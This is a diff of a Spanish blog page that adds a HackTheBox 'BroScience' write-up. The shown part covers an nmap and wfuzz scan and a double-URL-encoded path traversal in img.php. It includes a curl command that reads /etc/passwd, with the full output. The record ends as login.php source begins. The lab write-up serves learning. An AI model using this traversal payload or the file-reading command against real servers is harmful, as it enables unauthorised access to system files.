@@ -67,8 +67,8 @@
 <meta property="og:title" content="BroScience WriteUp" />
 <meta name="author" content="H4ckerLite" />
 <meta property="og:locale" content="es_ES" />
-<meta name="description" content="Proximamente…" />
-<meta property="og:description" content="Proximamente…" />
+<meta name="description" content="Tocaremos una máquina media de HackTheBox. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de directory transversal podremos ver una manera de conseguir elcodigo con una funcion de tiempo a crear la cuenta. Para la escalada nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como www-data. Con una base de datos de Postgresql podremos sacar la contraseña del usuario Bill y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado SSL. Escaneo NMAP Realizamos un escaneo NMAP." />
+<meta property="og:description" content="Tocaremos una máquina media de HackTheBox. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de directory transversal podremos ver una manera de conseguir elcodigo con una funcion de tiempo a crear la cuenta. Para la escalada nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como www-data. Con una base de datos de Postgresql podremos sacar la contraseña del usuario Bill y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado SSL. Escaneo NMAP Realizamos un escaneo NMAP." />
 <link rel="canonical" href="http://localhost:4000/posts/broscience-writeup/" />
 <meta property="og:url" content="http://localhost:4000/posts/broscience-writeup/" />
 <meta property="og:site_name" content="H4ckerLite Blog" />
@@ -83,7 +83,7 @@
 <meta name="twitter:site" content="@mortzelo" />
 <meta name="twitter:creator" content="@H4ckerLite" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-21T17:00:00+01:00","datePublished":"2023-03-21T17:00:00+01:00","description":"Proximamente…","headline":"BroScience WriteUp","image":{"alt":"BroScience WriteUp","url":"http://localhost:4000/assets/img/commons/broScience-writeup/BroScience.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/broscience-writeup/"},"url":"http://localhost:4000/posts/broscience-writeup/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-21T17:00:00+01:00","datePublished":"2023-03-21T17:00:00+01:00","description":"Tocaremos una máquina media de HackTheBox. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de directory transversal podremos ver una manera de conseguir elcodigo con una funcion de tiempo a crear la cuenta. Para la escalada nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como www-data. Con una base de datos de Postgresql podremos sacar la contraseña del usuario Bill y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado SSL. Escaneo NMAP Realizamos un escaneo NMAP.","headline":"BroScience WriteUp","image":{"alt":"BroScience WriteUp","url":"http://localhost:4000/assets/img/commons/broScience-writeup/BroScience.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/broscience-writeup/"},"url":"http://localhost:4000/posts/broscience-writeup/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -625,6 +625,1644 @@
     
 
   
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
 
   
 
@@ -642,6 +2280,113 @@
 
   
   
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
 
   
 
@@ -763,8 +2508,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="1 palabras">
-  <em>1 min</em> de lectura</span>
+  title="2678 palabras">
+  <em>14 min</em> de lectura</span>
 
     </div>
 
@@ -773,7 +2518,974 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <h1 id="proximamente">Proximamente…</h1>
+  <p>Tocaremos una máquina media de <a href="">HackTheBox</a>. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de <strong>directory transversal</strong> podremos ver una manera de conseguir elcodigo con una funcion de tiempo a crear la cuenta. Para la escalada nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como <strong>www-data</strong>. Con una base de datos de <strong>Postgresql</strong> podremos sacar la contraseña del usuario <strong>Bill</strong> y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado <strong>SSL</strong>.</p>
+<h2 id="escaneo-nmap"><span class="mr-2">Escaneo NMAP</span><a href="#escaneo-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Realizamos un escaneo NMAP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ nmap 10.10.11.195
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-29 16:46 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>10.10.11.195
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.32 seconds
+</pre></td></tr></tbody></table></code></div></div>
+<h2 id="analizando-la-web"><span class="mr-2">Analizando la Web</span><a href="#analizando-la-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p><img data-src="/assets/img/commons/broScience-writeup/1.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Web</em></p>
+
+<p>En el sertificado <strong>SSL</strong> encontramos un correo.</p>
+
+<div class="table-wrapper"><table>
+  <tbody>
+    <tr>
+      <td>administratror@broscience.htb</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p>Si miramos vemos que podemos logearnios y crear una cuenta.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/2.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Crear Cuenta</em></p>
+
+<p>Una vez creada  emos esto:</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/3.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Confrim Code</em></p>
+
+<p>Si intentamos logiarnos, nos dirá que la cuenta no está activada todavía.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/4.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Error</em></p>
+
+<p>Escaneando directorios vemos cosas ineresantes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.11.195/FUZZ 2&gt;/dev/null
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: https://10.10.11.195/FUZZ
+Total requests: 220547
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+<span class="o">=====================================================================</span>
+
+000000002:   301        9 L      28 W       315 Ch      <span class="s2">"images"</span>                                                                                                               
+000000624:   301        9 L      28 W       317 Ch      <span class="s2">"includes"</span>                                                                                                             
+000000716:   301        9 L      28 W       315 Ch      <span class="s2">"manual"</span>                                                                                                               
+000001059:   301        9 L      28 W       319 Ch      <span class="s2">"javascript"</span>                                                                                                           
+000001703:   301        9 L      28 W       315 Ch      <span class="s2">"styles"</span>                                                                                                               
+
+Total <span class="nb">time</span>: 90.60100
+Processed Requests: 10082
+Filtered Requests: 10077
+Requests/sec.: 111.2791
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.32 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/5.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Includes</em></p>
+
+<p>La ruta <strong>/includes</strong> nos llama la atención. Déspues de probar todos el unicó que nos llama la atención es  <strong>/img.php</strong>.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/6.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>img.php</em></p>
+
+<p>Si intentamos un directory transversal veremos esto:</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/7.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>img.php</em></p>
+<h2 id="bypassyng-con-doble-url-encode"><span class="mr-2">BYPASSYNG: Con doble URL ENCODE</span><a href="#bypassyng-con-doble-url-encode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Probando varios metos de ofuscacion me di cuenta que la baarra entra en conflicto, ¿Cómo se soluciona?, bueno podemos aplicar doble URL encode</p>
+
+<p>Exelente pregunta, les daré una breve explicacíon: 
+<strong>By ChatGPT</strong></p>
+
+<blockquote>
+  <p>Cuando se realiza una codificación de URL, algunos caracteres especiales se reemplazan por secuencias de escape que comienzan con el signo <code class="language-plaintext highlighter-rouge">%</code> seguido de un código hexadecimal. Por ejemplo, el caracter <code class="language-plaintext highlighter-rouge">/</code> se codifica como <code class="language-plaintext highlighter-rouge">%2f</code>.
+Si se tiene una cadena que ya ha sido codificada previamente y se desea codificarla nuevamente, se debe codificar cada uno de los caracteres que representan los caracteres especiales. En este caso, el <code class="language-plaintext highlighter-rouge">%</code> se codifica como <code class="language-plaintext highlighter-rouge">%25</code>, y luego el caracter <code class="language-plaintext highlighter-rouge">/</code> se codifica como <code class="language-plaintext highlighter-rouge">%2f</code>, resultando en la cadena <code class="language-plaintext highlighter-rouge">%252f</code>.</p>
+</blockquote>
+
+<p>Sabiendo eso podemos inntear leer el <code class="language-plaintext highlighter-rouge">/etc/password</code> podemos usar curl o BurpSuite.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/8.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Doble URL ENCODE</em></p>
+
+<p>En el reapeter apuntamos al <strong>/etc/passwd</strong>.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/9.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>/etc/passwd</em></p>
+
+<p>Ahora con curl.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">-k</span> <span class="s1">'https://10.10.11.195/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd'</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="directory-transversal"><span class="mr-2">Directory Transversal</span><a href="#directory-transversal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Ahora les comparto un <a href="https://github.com/h4ckerlite/BroScience-Script">script de bash</a> que cree para ahorrar tiempo. Una vez clonado lo ejecutamos y tratamos de ver información de la página de login(login.php). Viendo el codigo del archivo PHP</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="c1">// Check if user is logged in already</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Handle a submitted log in form</span>
